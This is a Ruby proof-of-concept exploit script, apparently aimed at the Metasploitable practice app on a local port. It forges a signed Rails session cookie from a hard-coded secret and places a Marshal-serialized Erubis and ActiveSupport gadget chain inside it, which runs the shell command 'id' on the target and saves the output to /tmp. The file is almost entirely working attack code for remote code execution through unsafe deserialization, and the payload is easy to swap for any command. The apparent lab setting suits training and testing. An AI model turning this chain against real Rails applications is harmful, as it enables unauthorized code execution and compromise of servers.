#!/usr/bin/env ruby

#
# This PoC will inject Ruby code in our vulnerable app.
# It will run the system command "id", and save the output in /tmp/your_id.txt
#

require 'openssl'
require 'cgi'
require 'net/http'

SECRET = "a7aebc287bba0ee4e64f947415a94e5f"

module Erubis;class Eruby;end;end
module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end

erubis = Erubis::Eruby.allocate
erubis.instance_variable_set :@src, "%x(id > /tmp/your_id.txt); 1"
proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set :@instance, erubis
proxy.instance_variable_set :@method, :result
proxy.instance_variable_set :@var, "@result"

session = { 'session_id' => '', 'exploit' => proxy }

dump = [ Marshal.dump(session) ].pack('m')
hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, dump)
cookie = "_metasploitable=#{CGI.escape("#{dump}--#{hmac}")}"

http = Net::HTTP.new('127.0.0.1', 8181)
req = Net::HTTP::Get.new('/')
req['Cookie'] = cookie
res = http.request(req)
puts "Done"
